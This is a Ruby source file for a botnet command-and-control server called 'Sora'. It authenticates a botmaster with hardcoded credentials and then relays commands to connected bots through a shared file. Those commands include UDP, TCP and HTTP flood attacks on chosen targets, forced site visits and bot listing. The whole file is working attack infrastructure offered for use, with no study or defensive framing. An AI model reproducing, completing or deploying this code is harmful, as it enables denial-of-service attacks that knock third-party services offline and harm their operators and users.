#!/usr/bin/env ruby
require 'socket'
require './lib/core'


uname = 'botmaster'    # Change this
password = 'ilovedogs' # Change this
cmd = ''


def writeCmd(command)
  cmdf = File.new("cmd.txt", 'w')
  cmdf.print(command)
  cmdf.close
end


def checkAttackCmd(command, client)
  split = command.split(" ")
  if split[0] == 'udp' && split.length == 3
    client.puts "Telling bots: #{command}"
    client.puts "Don't forget to clear after a little bit"
    return true
  elsif split[0] == 'tcp' && split.length == 5
    client.puts "Telling bots: #{command}"
    client.puts "Don't forget to clear after a little bit"
    return true
  elsif split[0] == 'http' && split.length == 4
    client.puts "Telling bots: #{command}"
    client.puts "Don't forget to clear after a little bit"
    return true
  else
    false
  end
end



server = TCPServer.new "0.0.0.0", ARGV[0].to_i  # Change this if you want
loop do
  Thread.start(server.accept) do |master|
    print_status("Master login connection from #{master.peeraddr[3]}")
    master.print "Username: "
    inputted_uname = master.gets
    master.print "Password: "
    inputted_pass = master.gets

    if inputted_uname.strip! != uname || inputted_pass.strip! != password
      master.puts "Don't try it"
      master.close
      print_err("Master login failed (used #{uname}:#{password})")
    end
    print_good("Master login successful!")
    master.print "
███████╗     ██████╗     ██████╗      █████╗
██╔════╝    ██╔═══██╗    ██╔══██╗    ██╔══██╗
███████╗    ██║   ██║    ██████╔╝    ███████║
╚════██║    ██║   ██║    ██╔══██╗    ██╔══██║
███████║    ╚██████╔╝    ██║  ██║    ██║  ██║
╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝
".colorize(:red)

    master.puts "Made with <3 by AM-77\n\n"
    while (cmd != 'exit')
      begin
        master.print "sora > "

        cmd = master.gets
        begin
         cmd = cmd.strip!
        rescue NoMethodError => nme # Prevents crash if client quits with CRTL+C
          next
        end
        puts "Master command recieved: #{cmd}"  # prints to main server
        split = cmd.split(' ')

        if cmd == "help" || cmd == '?'
          master.puts
          master.puts "udp <target> <time (ms)>                  Perform a UDP flood on <target> for <time> milliseconds using <threads> threads per system"
          master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
          master.puts "http <target> <time (ms)> <threads>       Perform a HTTP flood on <target> for <time> ms using <threads> threads"
          master.puts "botcount                                  Shows how many bots are connected"
          master.puts "botlist                                   Show all current bots"
          master.puts "visit <website>                           Have bots visit a website"
          master.puts
          master.puts "current                                   Shows the current command the bots are reading"
          master.puts
          master.puts "clear                                     Clear bot command (always do this after an attack command)"
          master.puts "exit                                      Exit the botmaster interface"
          master.puts "killall                                   Stop the listen server and botmaster interface"
          master.puts
          next
        elsif cmd == "botcount"
          master.puts(`wc -l bots.txt | awk '{print $1}'`)  # Some minor bash-fu
        elsif cmd.include?("udp") || cmd.include?("tcp") || cmd.include?("http")
          if checkAttackCmd(cmd, master)
            writeCmd(cmd)
          else
            master.puts "\033[31m Unknown command: #{cmd}\033[0m"
          end
        elsif cmd == "current"
          current_cmd = File.open("cmd.txt", 'r').read
          master.puts current_cmd
        elsif cmd == "clear"
          writeCmd("NONE")
        elsif cmd == ""
          next
        elsif cmd == "exit"
          master.puts "Bye bye!"
          master.close
          cmd = ""
        elsif cmd == "botlist"
          botlist = File.open("bots.txt", 'r')
          master.puts botlist.read
        elsif cmd.include? "geolocate"
          geolocate(cmd.split(" ")[1], master)
        elsif cmd == 'killall'
          system('pkill ruby')
          exit
        elsif cmd.include? "visit" && split.length == 2
          writeCmd(cmd)
        else
          master.puts "\033[31m Unknown command: #{cmd}\033[0m"
        end

      rescue Errno::EPROTOTYPE
        next
      rescue Errno::ECONNRESET
        next
      rescue Errno::EPIPE
        next
      rescue Errno::EADDRINUSE
        puts "Botmaster: Something's listening on port #{ARGV[1]}"
      end
  end

  next

end end
